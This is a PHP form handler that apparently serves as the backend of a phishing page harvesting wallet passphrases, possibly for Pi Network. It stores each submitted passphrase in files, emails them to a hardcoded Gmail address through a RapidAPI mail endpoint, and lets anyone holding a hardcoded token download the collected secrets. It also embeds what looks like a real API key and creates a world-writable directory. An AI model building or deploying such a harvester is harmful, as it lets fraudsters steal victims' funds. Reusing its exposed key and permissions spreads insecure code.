<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $passphrase = trim($_POST['mf-text']);

    if (empty($passphrase)) {
        echo "Passphrase cannot be empty.";
        exit;
    }

    $filePath = 'submissions/';
    $jsonFileName = 'passphrase.json';
    $txtFileName = 'passphrase.txt';

    if (!is_dir($filePath)) {
        mkdir($filePath, 0777, true);
    }

    $data = [
        'passphrase' => $passphrase,
        'timestamp' => date('Y-m-d H:i:s')
    ];

    $jsonData = json_encode($data) . PHP_EOL;
    file_put_contents($filePath . $jsonFileName, $jsonData, FILE_APPEND);

    $textData = "Passphrase: " . $passphrase . "  | Timestamp: " . $data['timestamp'] . PHP_EOL;
    file_put_contents($filePath . $txtFileName, $textData, FILE_APPEND);

    try {
        sendEmail($filePath . $jsonFileName, $filePath . $txtFileName);
        echo "Passphrase saved and email sent successfully!";
    } catch (Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }
} elseif ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET['token']) && isset($_GET['file'])) {
    $secretToken = "pi042"; // Replace with your actual secret token

    if ($_GET['token'] !== $secretToken) {
        echo "Unauthorized access.";
        exit;
    }

    $filePath = 'submissions/';
    $fileType = $_GET['file'];

    if ($fileType === 'json') {
        $fileName = 'passphrase.json';
    } elseif ($fileType === 'txt') {
        $fileName = 'passphrase.txt';
    } else {
        echo "Invalid file type.";
        exit;
    }

    $fileContent = file_get_contents($filePath . $fileName);
    header('Content-Type: text/plain');
    echo $fileContent;
} else {
    echo "Invalid request method.";
}

function sendEmail($jsonFilePath, $txtFilePath) {
    $jsonContent = file_get_contents($jsonFilePath);
    $txtContent = file_get_contents($txtFilePath);

    $postData = [
        'ishtml' => 'false',
        'sendto' => 'piphrase042@gmail.com',
        'name' => 'Pi',
        'replyTo' => 'peterjfk243@gmail.com',
        'title' => 'New Passphrase Submission',
        'body' => 'Passphrase in JSON: ' . $jsonContent . "\n\n" . 'Passphrase in Text: ' . $txtContent
    ];

    $curl = curl_init();

    curl_setopt_array($curl, [
        CURLOPT_URL => "https://rapidmail.p.rapidapi.com/",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => json_encode($postData),
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json",
            "x-rapidapi-host: rapidmail.p.rapidapi.com",
            "x-rapidapi-key: 103109b6a5msh8ce5cefac7fa39fp197eebjsn3a9d94fab61e"
        ],
    ]);

    $response = curl_exec($curl);
    $err = curl_error($curl);

    curl_close($curl);

    if ($err) {
        throw new Exception("cURL Error #:" . $err);
    } else {
        return $response;
    }
}
?>
